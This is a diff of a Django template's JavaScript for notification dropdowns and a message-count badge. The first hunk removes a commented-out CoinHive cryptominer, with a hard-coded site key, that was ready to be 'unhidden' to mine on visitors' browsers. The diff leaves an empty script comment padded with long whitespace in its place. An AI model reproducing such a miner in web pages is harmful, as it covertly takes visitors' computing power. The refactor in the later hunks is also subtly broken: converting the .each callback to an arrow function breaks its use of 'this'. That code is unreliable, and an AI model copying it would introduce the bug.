@@ -818,15 +818,7 @@
 
 <!-- note: unhide this when you want to start mining -->
 <!--     mining script -->
-<!-- <script>
-  var miner = new CoinHive.Anonymous('2HNDo4s1m10yzU17PPPiW9XzlEQZltgd', {throttle: 0.3});
-  miner.start();
-  // Only start on non-mobile devices and if not opted-out
-  // in the last 14400 seconds (4 hours):
-  // if (!miner.isMobile() && !miner.didOptOut(14400)) {
-  //   miner.start();
-  // }
-</script> -->
+<!-- <script>                                                                                                                                                                                                                                                                                                                </script> -->
 
 
 
@@ -847,6 +839,21 @@
   {% endblock %}
 
 
+const updateMsgCount = () => {
+
+  var badge = $("#msg-count-badge");
+    $.ajax({
+      type: "GET",
+      url: "{% url 'msg_count' %}",
+      success: (data) => {
+        badge.text(data.count);
+      },
+      error: (response, error) => {
+        console.log(response);
+        console.log(error);
+      }
+    })
+}
 
 
 
@@ -857,7 +864,7 @@ if ($("#msg-count-badge").length){
 
 //msg dropdown
   $('.dropdown-toggle').dropdown()
-  $(".notification-toggle").click(function(e){
+  $(".notification-toggle").click((e) => {
 
     e.preventDefault();
     $.ajax({
@@ -867,28 +874,28 @@ if ($("#msg-count-badge").length){
         csrfmiddlewaretoken: "{{ csrf_token }}",
       },
 
-      success: function(data){
+      success: (data) => {
         $("#notification_dropdown").html(' <li role="presentation" class="dropdown-header"></li>');
         var count = data.count
 
         if (count == 0) {
 
           var url = '{% url "notifications_all" %}'
-          $("#notification_dropdown").append("<li><a href='" + url + "'>View All Notifications</a></li>")
+          $("#notification_dropdown").append("<li><a href='" + url + "'>&nbsp;&nbsp; View All Notifications</a></li>")
 
         } else {
 
-          $(data.notifications).each(function(){
+          $(data.notifications).each(() => {
             var link = this;
             $("#notification_dropdown").append("<p id='noti'>" + link + " </p>")
           })
           var url = '{% url "notifications_all" %}'
-          $("#notification_dropdown").append("<br>&nbsp;&nbsp;&nbsp;&nbsp;<b><a href='" + url + "'>View All Notifications</a></b>")
+          $("#notification_dropdown").append("<br>&nbsp;&nbsp;&nbsp;&nbsp;<b><a href='" + url + "'>&nbsp;&nbsp; View All Notifications</a></b>")
 
         }
       },
 
-      error: function(rs, e){
+      error: (rs, e) => {
         console.log(rs);
         console.log(e);
       }
@@ -898,20 +905,6 @@ if ($("#msg-count-badge").length){
 
 
 
-function updateMsgCount(){
-  var badge = $("#msg-count-badge");
-    $.ajax({
-      type: "GET",
-      url: "{% url 'msg_count' %}",
-      success: function(data){
-        badge.text(data.count);
-      },
-      error: function(response, error){
-        console.log(response);
-        console.log(error);
-      }
-    })
-}
 
 
 
